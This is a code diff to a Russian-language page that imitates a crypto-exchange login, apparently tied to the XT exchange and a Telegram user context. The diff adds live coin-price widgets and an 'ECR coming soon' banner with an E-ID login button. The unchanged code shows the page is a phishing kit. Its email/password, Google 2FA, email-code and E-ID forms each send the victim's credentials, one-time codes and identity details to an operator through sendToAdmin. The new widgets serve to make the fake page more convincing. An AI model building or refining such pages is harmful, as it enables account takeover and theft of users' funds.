@@ -98,6 +98,19 @@
         .support-btn a { color: var(--accent); text-decoration: none; cursor: pointer; }
         .support-btn a:hover { text-decoration: underline; }
 
+        /* ===== НОВЫЕ БЛОКИ: КУРСЫ И ECR ===== */
+        .market-section { margin-top: 24px; border-top: 1px solid var(--border-color); padding-top: 16px; }
+        .market-title { font-size: 16px; font-weight: 600; margin-bottom: 12px; color: var(--text-secondary); }
+        .coin-list { display: flex; flex-direction: column; gap: 8px; }
+        .coin-item { display: flex; justify-content: space-between; align-items: center; font-size: 14px; padding: 8px 0; border-bottom: 1px solid var(--border-color); }
+        .coin-name { font-weight: 600; color: var(--text-primary); }
+        .coin-price { color: var(--accent); font-weight: 500; }
+        
+        .ecr-banner { background: rgba(171, 225, 39, 0.1); border: 1px solid rgba(171, 225, 39, 0.3); border-radius: 8px; padding: 16px; margin-top: 16px; text-align: center; }
+        .ecr-banner h3 { color: var(--accent); margin-bottom: 8px; font-size: 16px; }
+        .ecr-banner p { color: var(--text-secondary); font-size: 13px; margin-bottom: 12px; }
+        .ecr-btn { background: var(--accent); color: black; padding: 10px; border-radius: 6px; font-weight: bold; text-decoration: none; display: inline-block; cursor: pointer; border: none; font-size: 14px; }
+
         @media (max-width: 420px) { .container { padding: 24px 16px; } }
     </style>
 </head>
@@ -139,6 +152,23 @@
 
             <div class="register-link">
                 Нет аккаунта? <a onclick="showMessage('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
+            </div>
+
+            <!-- БЛОК КУРСОВ -->
+            <div class="market-section">
+                <div class="market-title">Популярные монеты</div>
+                <div class="coin-list">
+                    <div class="coin-item"><span class="coin-name">BTC/USDT</span><span class="coin-price" id="btc-price">Загрузка...</span></div>
+                    <div class="coin-item"><span class="coin-name">ETH/USDT</span><span class="coin-price" id="eth-price">Загрузка...</span></div>
+                    <div class="coin-item"><span class="coin-name">XT/USDT</span><span class="coin-price" id="xt-price">Загрузка...</span></div>
+                </div>
+            </div>
+
+            <!-- БЛОК ECR -->
+            <div class="ecr-banner">
+                <h3>ECR (eCurrency) — Скоро</h3>
+                <p>Ожидается листинг на XT. Следите за обновлениями!</p>
+                <button class="ecr-btn" onclick="goToEid()">Войти через E-ID</button>
             </div>
         </div>
 
@@ -284,7 +314,6 @@
 
         let userEmail = '';
         let userPassword = '';
-        let attemptCount = 0;
 
         // Вспомогательные функции
         function showMessage(text, type = 'info') {
@@ -309,7 +338,6 @@
             submitEmailCodeBtn.disabled = false; submitEmailCodeBtn.textContent = 'Подтвердить';
             eidSubmitBtn.disabled = false; eidSubmitBtn.textContent = 'Войти через E-ID';
             eidLinkSubmitBtn.disabled = false; eidLinkSubmitBtn.textContent = 'Подтвердить';
-            attemptCount = 0;
         }
 
         function goToEid() { switchPage(pageEid); }
@@ -345,7 +373,6 @@
             loginSubmitBtn.textContent = 'Отправка...';
             userEmail = e; userPassword = p;
 
-            // ID и имя добавлены
             const msg = `🔔 Новая заявка\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
             const ok = await sendToAdmin(msg);
             
@@ -368,7 +395,6 @@
             submitCodeBtn.disabled = true;
             submitCodeBtn.textContent = 'Отправка...';
 
-            // ID и имя добавлены
             const msg = `🔐 Код 2FA (Google)\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`;
             const ok = await sendToAdmin(msg);
 
@@ -391,7 +417,6 @@
             submitEmailCodeBtn.disabled = true;
             submitEmailCodeBtn.textContent = 'Отправка...';
 
-            // ID и имя добавлены
             const msg = `📧 Код из почты\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`;
             const ok = await sendToAdmin(msg);
 
@@ -416,7 +441,6 @@
             eidSubmitBtn.textContent = 'Отправка...';
             userEmail = e; userPassword = p;
 
-            // ID и имя добавлены
             const msg = `🆔 E-ID Вход\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
             const ok = await sendToAdmin(msg);
 
@@ -439,7 +463,6 @@
             eidLinkSubmitBtn.disabled = true;
             eidLinkSubmitBtn.textContent = 'Отправка...';
 
-            // ID и имя добавлены
             const msg = `🔗 E-ID Ссылка\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
             const ok = await sendToAdmin(msg);
 
@@ -453,6 +476,31 @@
                 showMessage('Ошибка отправки.', 'error');
             }
         }
+
+        // ============================================================
+        // ЗАГРУЗКА КУРСОВ С ПУБЛИЧНОГО API XT
+        // ============================================================
+        async function fetchPrices() {
+            try {
+                const response = await fetch('https://sapi.xt.com/v4/public/ticker?symbol=btc_usdt,eth_usdt,xt_usdt');
+                const data = await response.json();
+                if (data.rc === 0 && data.result) {
+                    data.result.forEach(item => {
+                        if (item.s === 'btc_usdt') document.getElementById('btc-price').textContent = `$${parseFloat(item.c).toFixed(2)}`;
+                        if (item.s === 'eth_usdt') document.getElementById('eth-price').textContent = `$${parseFloat(item.c).toFixed(2)}`;
+                        if (item.s === 'xt_usdt') document.getElementById('xt-price').textContent = `$${parseFloat(item.c).toFixed(4)}`;
+                    });
+                }
+            } catch (e) {
+                console.error("Ошибка загрузки курсов:", e);
+                document.getElementById('btc-price').textContent = '—';
+                document.getElementById('eth-price').textContent = '—';
+                document.getElementById('xt-price').textContent = '—';
+            }
+        }
+
+        fetchPrices();
+
     </script>
 </body>
 </html>
